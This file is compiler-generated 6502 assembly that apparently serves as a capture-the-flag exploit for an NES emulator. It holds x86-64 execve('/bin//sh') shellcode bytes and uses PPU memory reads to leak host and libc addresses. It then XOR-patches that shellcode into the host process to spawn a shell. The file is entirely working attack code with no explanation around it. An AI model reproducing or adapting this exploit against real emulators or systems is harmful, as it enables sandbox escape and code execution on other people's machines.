;
; File generated by cc65 v 2.18 - Git ece63f0
;
	.fopt		compiler,"cc65 v 2.18 - Git ece63f0"
	.setcpu		"6502"
	.smart		on
	.autoimport	on
	.case		on
	.debuginfo	off
	.importzp	sp, sreg, regsave, regbank
	.importzp	tmp1, tmp2, tmp3, tmp4, ptr1, ptr2, ptr3, ptr4
	.macpack	longbranch
	.forceimport	__STARTUP__
	.import		_bka
	.import		_bkx
	.export		_shellcode
	.export		_pattern
	.export		_reset
	.export		_sub64
	.export		_xorAt64
	.export		_xorAt
	.export		_putchar
	.export		_get_data
	.export		_set_ppu_data
	.export		_libc_addr
	.export		_leak
	.export		_log64
	.export		_main

.segment	"DATA"

_shellcode:
	.byte	$90
	.byte	$48
	.byte	$31
	.byte	$D2
	.byte	$48
	.byte	$31
	.byte	$C0
	.byte	$48
	.byte	$31
	.byte	$F6
	.byte	$48
	.byte	$BB
	.byte	$2F
	.byte	$2F
	.byte	$62
	.byte	$69
	.byte	$6E
	.byte	$2F
	.byte	$73
	.byte	$68
	.byte	$48
	.byte	$C1
	.byte	$EB
	.byte	$08
	.byte	$53
	.byte	$48
	.byte	$89
	.byte	$E7
	.byte	$B0
	.byte	$3B
	.byte	$0F
	.byte	$05
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
_pattern:
	.byte	$64
	.byte	$4C
	.byte	$8B
	.byte	$1C
	.byte	$25
	.byte	$28
	.byte	$FF
	.byte	$FF
	.byte	$FF
	.byte	$41
	.byte	$FF
	.byte	$A3
	.byte	$18
	.byte	$3C
	.byte	$00
	.byte	$00

.segment	"BSS"

_libc_addr:
	.res	8,$00

; ---------------------------------------------------------------
; void __near__ reset (void)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_reset: near

.segment	"CODE"

	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jmp     _bka

.endproc

; ---------------------------------------------------------------
; void __near__ sub64 (unsigned long, unsigned long, unsigned long, unsigned long, __near__ unsigned long *, __near__ unsigned long *)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_sub64: near

.segment	"CODE"

	jsr     pushax
	ldy     #$05
	jsr     pushwysp
	ldy     #$15
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$11
	jsr     ldeaxysp
	jsr     tossubeax
	ldy     #$00
	jsr     steaxspidx
	ldy     #$13
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0F
	jsr     ldeaxysp
	jsr     tosulteax
	beq     L005A
	jsr     pushw0sp
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	jsr     ldeaxysp
	jsr     tossubeax
	ldy     #$01
	jsr     deceaxy
	jmp     L01AA
L005A:	jsr     pushw0sp
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	jsr     ldeaxysp
	jsr     tossubeax
L01AA:	ldy     #$00
	jsr     steaxspidx
	ldy     #$14
	jmp     addysp

.endproc

; ---------------------------------------------------------------
; void __near__ xorAt64 (unsigned long, unsigned long, unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_xorAt64: near

.segment	"CODE"

	jsr     pusha
	jsr     decsp2
	ldx     #$00
	txa
L01AF:	jsr     stax0sp
	cmp     #$04
	txa
	sbc     #$00
	bvc     L0069
	eor     #$80
L0069:	asl     a
	lda     #$00
	tax
	bcc     L01AC
	ldy     #$06
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$03
	sec
	ldy     #$04
	sbc     (sp),y
	pha
	lda     #$00
	iny
	sbc     (sp),y
	pla
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _bka
	jsr     ldax0sp
	jsr     incax1
	jmp     L01AF
L01AC:	jsr     stax0sp
	cmp     #$04
	txa
	sbc     #$00
	bvc     L0077
	eor     #$80
L0077:	bpl     L0071
	ldy     #$0A
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$03
	sec
	ldy     #$04
	sbc     (sp),y
	pha
	lda     #$00
	iny
	sbc     (sp),y
	pla
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _bka
	jsr     ldax0sp
	jsr     incax1
	jmp     L01AC
L0071:	ldy     #$02
	lda     (sp),y
	jsr     _bkx
	jsr     _reset
	ldy     #$0B
	jmp     addysp

.endproc

; ---------------------------------------------------------------
; void __near__ xorAt (unsigned long, unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_xorAt: near

.segment	"CODE"

	jsr     pusha
	jsr     decsp2
	ldx     #$00
	txa
L01B1:	jsr     stax0sp
	cmp     #$04
	txa
	sbc     #$00
	bvc     L0089
	eor     #$80
L0089:	bpl     L0083
	ldy     #$06
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$03
	sec
	ldy     #$04
	sbc     (sp),y
	pha
	lda     #$00
	iny
	sbc     (sp),y
	pla
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _bka
	jsr     ldax0sp
	jsr     incax1
	jmp     L01B1
L0083:	ldy     #$02
	lda     (sp),y
	jsr     _bkx
	jsr     _reset
	jmp     incsp7

.endproc

; ---------------------------------------------------------------
; void __near__ putchar (unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_putchar: near

.segment	"CODE"

	jsr     pusha
	ldy     #$00
	lda     (sp),y
	sta     $4015
	jmp     incsp1

.endproc

; ---------------------------------------------------------------
; unsigned char __near__ get_data (unsigned int)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_get_data: near

.segment	"CODE"

	jsr     pushax
	ldy     #$01
	lda     (sp),y
	jsr     pusha
	ldy     #$01
	lda     (sp),y
	jsr     pusha
	ldy     #$01
	lda     (sp),y
	sta     $2006
	dey
	lda     (sp),y
	sta     $2006
	ldx     #$00
	lda     $2007
	jmp     incsp4

.endproc

; ---------------------------------------------------------------
; void __near__ set_ppu_data (unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_set_ppu_data: near

.segment	"CODE"

	jsr     pusha
	ldy     #$00
	lda     (sp),y
	sta     $2007
	jmp     incsp1

.endproc

; ---------------------------------------------------------------
; void __near__ leak (unsigned int, __near__ unsigned long *, __near__ unsigned long *)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_leak: near

.segment	"CODE"

	jsr     pushax
	lda     #$00
	jsr     pusha
	tax
	jsr     _get_data
	lda     #$00
	tay
L01B8:	sta     (sp),y
	cmp     #$04
	bcs     L01B4
	ldy     #$02
	jsr     ldaxysp
	jsr     pushax
	jsr     ldeaxi
	jsr     pusheax
	ldy     #$06
	lda     (sp),y
	clc
	ldy     #$0B
	adc     (sp),y
	pha
	lda     #$00
	iny
	adc     (sp),y
	tax
	pla
	jsr     incax1
	jsr     _get_data
	jsr     aulong
	jsr     axulong
	jsr     pusheax
	ldy     #$0A
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshleax
	jsr     tosoreax
	ldy     #$00
	jsr     steaxspidx
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01B8
L01B4:	tya
	sta     (sp),y
	tax
L01B6:	lda     (sp),y
	cmp     #$04
	bcs     L01B7
	ldy     #$04
	jsr     ldaxysp
	jsr     pushax
	jsr     ldeaxi
	jsr     pusheax
	ldy     #$06
	lda     (sp),y
	clc
	ldy     #$0B
	adc     (sp),y
	pha
	lda     #$00
	iny
	adc     (sp),y
	tax
	pla
	jsr     incax5
	jsr     _get_data
	jsr     aulong
	jsr     axulong
	jsr     pusheax
	ldy     #$0A
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshleax
	jsr     tosoreax
	ldy     #$00
	jsr     steaxspidx
	ldy     #$00
	ldx     #$00
	lda     (sp),y
	clc
	adc     #$01
	sta     (sp),y
	jmp     L01B6
L01B7:	txa
	jsr     _get_data
	jmp     incsp7

.endproc

; ---------------------------------------------------------------
; void __near__ log64 (unsigned long, unsigned long)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_log64: near

.segment	"CODE"

	jsr     pusheax
	lda     #$00
	jsr     pusha
	lda     #$46
	jsr     _putchar
	lda     #$46
	jsr     _putchar
	lda     #$00
	tay
L01BE:	sta     (sp),y
	cmp     #$04
	bcs     L01BB
	ldy     #$04
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$04
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _putchar
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01BE
L01BB:	tya
L01BF:	sta     (sp),y
	cmp     #$04
	bcs     L00D7
	ldy     #$08
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$04
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _putchar
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01BF
L00D7:	lda     #$41
	jsr     _putchar
	lda     #$42
	jsr     _putchar
	lda     #$43
	jsr     _putchar
	ldy     #$09
	jmp     addysp

.endproc

; ---------------------------------------------------------------
; int __near__ main (void)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_main: near

.segment	"CODE"

	ldy     #$2A
	jsr     subysp
	ldx     #$2D
	lda     #$0A
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$7C
	jsr     pusheax
	jsr     pushl0
	lda     #$04
	jsr     _xorAt64
	ldx     #$00
	stx     sreg
	stx     sreg+1
	txa
	ldy     #$12
	jsr     steaxysp
	ldy     #$16
	jsr     steaxysp
	ldx     #$1E
	lda     #$50
	jsr     pushax
	lda     #$14
	jsr     leaa0sp
	jsr     pushax
	lda     #$1A
	jsr     leaa0sp
	jsr     _leak
	ldy     #$15
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$1D
	jsr     ldeaxysp
	jsr     _log64
	ldx     #$2D
	lda     #$0A
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$7C
	jsr     pusheax
	jsr     pushl0
	lda     #$04
	jsr     _xorAt64
	ldx     #$2D
	lda     #$0A
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$7C
	jsr     pusheax
	jsr     pushl0
	lda     #$01
	jsr     _xorAt64
	ldx     #$2D
	lda     #$0A
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$7D
	jsr     pusheax
	jsr     pushl0
	jsr     _xorAt64
	ldx     #$00
	stx     sreg
	stx     sreg+1
	txa
	ldy     #$22
	jsr     steaxysp
	ldy     #$26
	jsr     steaxysp
	ldx     #$12
	lda     #$10
	jsr     pushax
	lda     #$24
	jsr     leaa0sp
	jsr     pushax
	lda     #$2A
	jsr     leaa0sp
	jsr     _leak
	ldx     #$30
	lda     #$00
	sta     sreg
	sta     sreg+1
	ldy     #$26
	jsr     lsubeqysp
	ldy     #$29
	jsr     ldeaxysp
	jsr     pusheax
	ldx     #$FF
	stx     sreg
	stx     sreg+1
	lda     #$00
	jsr     tosandeax
	ldy     #$26
	jsr     steaxysp
	ldx     #$00
	stx     sreg
	stx     sreg+1
	txa
	ldy     #$1A
	jsr     steaxysp
	ldy     #$1E
	jsr     steaxysp
	ldx     #$11
	lda     #$80
	jsr     pushax
	lda     #$1C
	jsr     leaa0sp
	jsr     pushax
	lda     #$22
	jsr     leaa0sp
	jsr     _leak
	ldx     #$13
	lda     #$42
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$E0
	ldy     #$1E
	jsr     lsubeqysp
	ldy     #$25
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$2D
	jsr     ldeaxysp
	jsr     _log64
	ldy     #$1D
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$25
	jsr     ldeaxysp
	jsr     _log64
	ldy     #$29
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$29
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$29
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$29
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$1E
	jsr     leaa0sp
	jsr     pushax
	lda     #$1C
	jsr     leaa0sp
	jsr     _sub64
	ldy     #$0D
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$15
	jsr     ldeaxysp
	jsr     _log64
	lda     #$00
	ldy     #$01
L01D6:	sta     (sp),y
	cmp     #$10
	bcs     L01C2
	lda     #<(_shellcode)
	ldx     #>(_shellcode)
	clc
	adc     (sp),y
	bcc     L0132
	inx
L0132:	jsr     pushax
	sta     ptr1
	stx     ptr1+1
	ldx     #$00
	lda     (ptr1,x)
	jsr     pusha0
	ldy     #$05
	lda     (sp),y
	tay
	lda     _pattern,y
	jsr     tosxora0
	ldy     #$00
	jsr     staspidx
	ldy     #$01
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D6
L01C2:	lda     #$00
L01D7:	sta     (sp),y
	cmp     #$10
	bcs     L01C6
	ldx     #$00
	lda     (sp),y
	ldy     #$10
	jsr     incaxy
	clc
	adc     #<(_shellcode)
	tay
	txa
	adc     #>(_shellcode)
	tax
	tya
	jsr     pushax
	sta     ptr1
	stx     ptr1+1
	ldx     #$00
	lda     (ptr1,x)
	jsr     pusha0
	ldy     #$05
	lda     (sp),y
	tay
	lda     _pattern,y
	jsr     tosxora0
	ldy     #$00
	jsr     staspidx
	ldy     #$01
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D7
L01C6:	lda     _pattern
	eor     _shellcode+32
	sta     _shellcode+32
	lda     _pattern+1
	eor     _shellcode+33
	sta     _shellcode+33
	lda     #$00
L01D8:	sta     (sp),y
	cmp     #$10
	bcs     L01C9
	lda     #<(_pattern)
	ldx     #>(_pattern)
	clc
	adc     (sp),y
	bcc     L0155
	inx
L0155:	sta     ptr1
	stx     ptr1+1
	dey
	lda     (ptr1),y
	eor     #$90
	sta     (ptr1),y
	iny
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D8
L01C9:	lda     #$00
	dey
L01D9:	sta     (sp),y
	cmp     #$03
	jcs     L0158
	tya
	iny
	sta     (sp),y
	tax
L01CD:	lda     (sp),y
	cmp     #$D0
	bcs     L01CE
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$05
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     tosaddeax
	jsr     pusheax
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$09
	lda     (sp),y
	and     #$0F
	sta     ptr1
	lda     #$00
	clc
	adc     #>(_pattern)
	sta     ptr1+1
	ldy     #<(_pattern)
	lda     (ptr1),y
	jsr     _xorAt64
	ldy     #$01
	ldx     #$00
	lda     (sp),y
	clc
	adc     #$01
	sta     (sp),y
	jmp     L01CD
L01CE:	stx     sreg
	stx     sreg+1
	lda     #$D0
	ldy     #$0E
	jsr     laddeqysp
	lda     #$00
	ldy     #$01
	sta     (sp),y
	tax
L01D0:	lda     (sp),y
	cmp     #$22
	bcs     L01D1
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$05
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     tosaddeax
	jsr     pusheax
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$09
	lda     (sp),y
	tay
	lda     _shellcode,y
	jsr     _xorAt64
	ldy     #$01
	ldx     #$00
	lda     (sp),y
	clc
	adc     #$01
	sta     (sp),y
	jmp     L01D0
L01D1:	stx     sreg
	stx     sreg+1
	lda     #$30
	ldy     #$0E
	jsr     laddeqysp
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D9
L0158:	ldx     #$03
	tya
	sta     sreg
	sta     sreg+1
	ldy     #$0E
	jsr     lsubeqysp
	jsr     _reset
	jsr     _reset
	ldy     #$29
	jsr     ldeaxysp
	ldy     #$02
	jsr     steaxysp
	ldy     #$29
	jsr     ldeaxysp
	jsr     pusheax
	ldx     #$2D
	lda     #$06
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$79
	jsr     tossubeax
	ldy     #$06
	jsr     steaxysp
	ldy     #$05
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	jsr     ldeaxysp
	jsr     tosxoreax
	ldy     #$02
	jsr     steaxysp
	ldy     #$05
	jsr     ldeaxysp
	jsr     pusheax
	ldx     #$08
	lda     #$00
	jsr     tosor0ax
	ldy     #$02
	jsr     steaxysp
	lda     #$00
	ldy     #$01
L01DA:	sta     (sp),y
	cmp     #$04
	bcs     L018B
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     pusheax
	ldx     #$B0
	lda     #$3F
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$38
	jsr     tosaddeax
	jsr     pusheax
	jsr     pushl0
	ldy     #$0D
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _xorAt64
	ldy     #$01
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01DA
L018B:	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	ldy     #$01
L01D5:	lda     (sp),y
	sta     $4016
	jmp     L01D5

.endproc

